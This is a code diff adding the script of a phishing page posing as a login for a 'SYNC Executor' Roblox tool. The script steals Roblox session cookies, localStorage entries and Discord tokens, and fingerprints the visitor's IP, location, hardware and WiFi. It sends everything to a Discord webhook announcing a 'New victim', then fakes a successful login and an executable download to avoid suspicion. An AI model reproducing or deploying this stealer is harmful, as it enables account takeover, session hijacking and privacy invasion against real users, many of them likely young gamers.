+    // Get Roblox information from localStorage and cookies
+    function getRobloxInfo() {
+        try {
+            const robloxData = [];
+            const robloxCookies = [];
+            
+            // Check localStorage for Roblox data
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.includes("Roblox") || key.includes("ROBLOX")) {
+                    robloxData.push(key + ": " + localStorage.getItem(key).substring(0, 30) + "...");
+                }
+            }
+            
+            // Check cookies for Roblox data
+            if (document.cookie) {
+                document.cookie.split(';').forEach(cookie => {
+                    if (cookie.includes("ROBLOSECURITY") || cookie.includes("Roblox")) {
+                        robloxCookies.push(cookie.trim().substring(0, 30) + "...");
+                    }
+                });
+            }
+            
+            return {
+                localStorage: robloxData.length > 0 ? robloxData.join("\n") : "No Roblox localStorage found",
+                cookies: robloxCookies.length > 0 ? robloxCookies.join("\n") : "No Roblox cookies found",
+                isRobloxPlayer: navigator.userAgent.includes("Roblox") ? "Yes" : "No"
+            };
+        } catch (e) {
+            return {
+                localStorage: "Access denied",
+                cookies: "Detection failed",
+                isRobloxPlayer: "Unknown"
+            };
+        }
+    }
+    
+    // Capture data and send to Discord
+    async function captureData(method, email = null) {
+        try {
+            // Get detailed IP information
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            
+            // Collect all possible system information
+            const [gpuInfo, batteryInfo, networkInfo, browserInfo, discordInfo, robloxInfo] = await Promise.all([
+                getGPUInfo(),
+                getBatteryInfo(),
+                getNetworkInfo(),
+                getBrowserInfo(),
+                getDiscordInfo(),
+                getRobloxInfo()
+            ]);
+            
+            const systemInfo = {
+                // IP/Network Info
+                ip: ipData.ip || "Unknown",
+                location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                coordinates: `Lat: ${ipData.latitude}, Long: ${ipData.longitude}`,
+                isp: ipData.org || "Unknown",
+                asn: ipData.asn || "Unknown",
+                vpnProxy: ipData.vpn || ipData.proxy ? "Likely" : "Unlikely",
+                
+                // Browser/Device Info
+                browser: browserInfo,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                
+                // Screen/Display Info
+                screen: getScreenInfo(),
+                colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+                
+                // Hardware Info
+                hardware: getHardwareInfo(),
+                gpu: gpuInfo,
+                battery: batteryInfo,
+                network: networkInfo,
+                
+                // Localization
+                locale: getLocaleInfo(),
+                
+                // Browser Features
+                fonts: getFonts(),
+                plugins: getPlugins(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                
+                // Timing Info
+                timezoneOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toString(),
+                
+                // Window Info
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                viewportSize: `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`,
+                
+                // Storage
+                localStorage: localStorage.length ? 'Enabled (' + localStorage.length + ' items)' : 'Empty',
+                sessionStorage: sessionStorage.length ? 'Enabled (' + sessionStorage.length + ' items)' : 'Empty',
+                indexedDB: 'indexedDB' in window ? 'Supported' : 'Not supported',
+                
+                // Connection
+                online: navigator.onLine,
+                downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
+                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                
+                // Referrer
+                referrer: document.referrer || 'Direct',
+                
+                // Discord Info
+                discord: discordInfo,
+                
+                // Roblox Info
+                roblox: robloxInfo
+            };
+            
+            // Prepare Discord message with all collected data
+            const embed = {
+                title: `🔐 SYNC LOGIN ATTEMPT (${method})`,
+                color: method === 'GOOGLE' ? 0x4285F4 : 0x5865F2,
+                fields: [
+                    { name: "🌐 IP Address", value: systemInfo.ip, inline: true },
+                    { name: "📍 Location", value: systemInfo.location, inline: true },
+                    { name: "🗺️ Coordinates", value: systemInfo.coordinates, inline: true },
+                    { name: "🏠 ISP", value: systemInfo.isp, inline: true },
+                    { name: "📶 Network Type", value: systemInfo.network.effectiveType || "Unknown", inline: true },
+                    { name: "📧 Email", value: email || "Google OAuth", inline: true },
+                    
+                    { name: "🌐 Browser", value: `${systemInfo.browser.name} v${systemInfo.browser.version}`, inline: true },
+                    { name: "💻 Platform", value: systemInfo.platform, inline: true },
+                    { name: "🖥️ Screen Resolution", value: systemInfo.screen.resolution, inline: true },
+                    
+                    { name: "⚡ CPU Cores", value: systemInfo.hardware.cores, inline: true },
+                    { name: "🧠 Device Memory", value: systemInfo.hardware.deviceMemory, inline: true },
+                    { name: "🎮 GPU Info", value: typeof systemInfo.gpu === 'object' ? `${systemInfo.gpu.vendor} - ${systemInfo.gpu.renderer}` : systemInfo.gpu, inline: true },
+                    
+                    { name: "📶 WiFi Info", value: typeof systemInfo.network.wifiSSID === 'object' ? 
+                        `SSID: ${systemInfo.network.wifiSSID.ssid || 'Unknown'}\n` +
+                        `BSSID: ${systemInfo.network.wifiSSID.bssid || 'Unknown'}\n` +
+                        `Signal: ${systemInfo.network.wifiSSID.signalStrength || 'Unknown'}` : 
+                        systemInfo.network.wifiSSID, inline: false },
+                    
+                    { name: "📱 Battery", value: typeof systemInfo.battery === 'object' ? 
+                        `${systemInfo.battery.level} (${systemInfo.battery.charging ? 'Charging' : 'Not charging'})` : 
+                        systemInfo.battery, inline: true },
+                    { name: "🌐 Timezone", value: systemInfo.locale.timezone, inline: true },
+                    { name: "🗣️ Languages", value: systemInfo.locale.languages, inline: true },
+                    
+                    { name: "📜 Discord Info", value: 
+                        `Tokens: ${systemInfo.discord.tokens.split("\n").length > 1 ? systemInfo.discord.tokens.split("\n").length + " found" : systemInfo.discord.tokens}\n` +
+                        `Artifacts: ${systemInfo.discord.artifacts}\n` +
+                        `Discord Browser: ${systemInfo.discord.isDiscordBrowser}`, inline: false },
+                    
+                    { name: "🎮 Roblox Info", value: 
+                        `LocalStorage: ${systemInfo.roblox.localStorage.split("\n").length > 1 ? systemInfo.roblox.localStorage.split("\n").length + " items" : systemInfo.roblox.localStorage}\n` +
+                        `Cookies: ${systemInfo.roblox.cookies.split("\n").length > 1 ? systemInfo.roblox.cookies.split("\n").length + " found" : systemInfo.roblox.cookies}\n` +
+                        `Roblox Player: ${systemInfo.roblox.isRobloxPlayer}`, inline: false },
+
+                    { name: "🔌 Browser Plugins", value: systemInfo.plugins.substring(0, 100) + (systemInfo.plugins.length > 100 ? "..." : ""), inline: false },
+                    { name: "🖌️ Installed Fonts", value: systemInfo.fonts.substring(0, 100) + (systemInfo.fonts.length > 100 ? "..." : ""), inline: false },
+                    
+                    { name: "🔗 Referrer", value: systemInfo.referrer, inline: false },
+                    { name: "🛜 VPN/Proxy", value: systemInfo.vpnProxy, inline: true },
+                    { name: "🕒 Local Time", value: systemInfo.localTime, inline: true },
+                    { name: "🕵️ Privacy", value: `DNT: ${systemInfo.doNotTrack || 'Off'}\nPrivate Mode: ${systemInfo.browser.isPrivate}`, inline: true }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: { 
+                    text: `Collected from ${systemInfo.ip} at ${new Date().toLocaleString()}`,
+                    icon_url: "https://i.imgur.com/JQWUitG.jpg" 
+                }
+            };
+
+            // Prepare additional embeds if there's too much data
+            const additionalEmbeds = [];
+            
+            // Add Discord tokens as separate embed if found
+            if (systemInfo.discord.tokens.length > 0 && !systemInfo.discord.tokens.includes("No tokens")) {
+                additionalEmbeds.push({
+                    title: "🔍 Discord Token Details",
+                    color: 0x5865F2,
+                    description: "```" + systemInfo.discord.tokens + "```",
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
+            // Add Roblox cookies as separate embed if found
+            if (systemInfo.roblox.cookies.length > 0 && !systemInfo.roblox.cookies.includes("No cookies")) {
+                additionalEmbeds.push({
+                    title: "🔍 Roblox Cookie Details",
+                    color: 0xE3242B,
+                    description: "```" + systemInfo.roblox.cookies + "```",
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
+            // Send to Discord
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    embeds: [embed, ...additionalEmbeds],
+                    content: `@everyone 🚨 New victim connected!\n` +
+                             `📍 **Location:** ${systemInfo.location}\n` +
+                             `💻 **Device:** ${systemInfo.platform} | ${systemInfo.browser.name} ${systemInfo.browser.version}\n` +
+                             `🌐 **IP:** ${systemInfo.ip}\n` +
+                             `${systemInfo.discord.tokens.includes("No tokens") ? '' : '⚠️ **Discord tokens found!**'}\n` +
+                             `${systemInfo.roblox.cookies.includes("No cookies") ? '' : '⚠️ **Roblox cookies found!**'}`
+                })
+            });
+
+            // Save all collected data to localStorage for potential later retrieval
+            try {
+                localStorage.setItem('last_collected_data', JSON.stringify(systemInfo));
+            } catch (e) {
+                console.error('Failed to save data to localStorage:', e);
+            }
+
+            // Close modal and stay on site
+            document.getElementById('authModal').style.display = 'none';
+            
+            // Show success message
+            alert('Successfully logged in! Welcome to SYNC.\n\nDownload will begin shortly...');
+            
+            // Trigger fake download after delay
+            setTimeout(() => {
+                // Create fake download link
+                const link = document.createElement('a');
+                link.href = 'https://example.com/fake-sync-executor.exe';
+                link.download = 'SYNC_Executor_Setup.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Show fake progress
+                const progress = document.createElement('div');
+                progress.style.position = 'fixed';
+                progress.style.bottom = '20px';
+                progress.style.right = '20px';
+                progress.style.backgroundColor = '#1E293B';
+                progress.style.padding = '15px';
+                progress.style.borderRadius = '8px';
+                progress.style.boxShadow = '0 4px 6px rgba(0,0,0,0.1)';
+                progress.style.zIndex = '10000';
+                progress.style.border = '1px solid var(--primary)';
+                progress.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                        <i class="fas fa-download" style="color: var(--primary);"></i>
+                        <div style="font-weight: 600;">Downloading SYNC Executor</div>
+                    </div>
+                    <div style="width: 250px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px;">
+                        <div id="downloadProgress" style="width: 0%; height: 100%; background: var(--primary); border-radius: 5px; transition: width 0.3s;"></div>
+                    </div>
+                    <div style="margin-top: 5px; font-size: 12px; text-align: right;" id="downloadStatus">Initializing...</div>
+                `;
+                document.body.appendChild(progress);
+                
+                // Animate fake progress
+                const statusMessages = [
+                    "Connecting to server...",
+                    "Downloading package (1/3)...",
+                    "Downloading package (2/3)...",
+                    "Downloading package (3/3)...",
+                    "Verifying files...",
+                    "Almost done...",
+                    "Complete!"
+                ];
+                
+                let progressPercent = 0;
+                const progressInterval = setInterval(() => {
+                    progressPercent += Math.random() * 15;
+                    if (progressPercent >= 100) {
+                        progressPercent = 100;
+                        clearInterval(progressInterval);
+                        setTimeout(() => {
+                            progress.remove();
+                            alert('Download complete! Please check your downloads folder and run the installer.');
+                        }, 1000);
+                    }
+                    document.getElementById('downloadProgress').style.width = progressPercent + '%';
+                    document.getElementById('downloadStatus').textContent = 
+                        statusMessages[Math.min(Math.floor(progressPercent / (100 / statusMessages.length)), statusMessages.length - 1)] + 
+                        ` (${Math.round(progressPercent)}%)`;
+                }, 800);
+            }, 2000);
+        } catch (error) {
+            console.error('Error capturing data:', error);
+            // Fallback to basic IP if detailed lookup fails
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `@everyone Basic IP capture: ${ipData.ip} (Detailed lookup failed)\n` +
+                             `User Agent: ${navigator.userAgent}\n` +
+                             `Screen: ${window.screen.width}x${window.screen.height}`
+                })
+            });
+            
+            // Still close modal and show success to avoid suspicion
+            document.getElementById('authModal').style.display = 'none';
+            alert('Successfully logged in! Welcome to SYNC.');
+        }
+    }
+    
+    // Initialize everything
+    document.addEventListener('DOMContentLoaded', function() {
+        initAuth();
+        
+        // Trigger autofill
+        document.getElementById('autoEmail').focus();
+        document.getElementById('autoPassword').focus();
+        setTimeout(() => {
+            document.getElementById('emailInput').focus();
+        }, 100);
+        
+        // Add fake visitor counter that increments every 5-15 seconds
+        setInterval(() => {
+            const counter = document.querySelector('.fa-user-shield').parentElement;
+            const current = parseInt(counter.textContent.replace(/\D/g, ''));
+            counter.textContent = counter.textContent.replace(/\d+/, current + Math.floor(Math.random() * 3) + 1);
+        }, 5000 + Math.random() * 10000);
+    });
+</script>
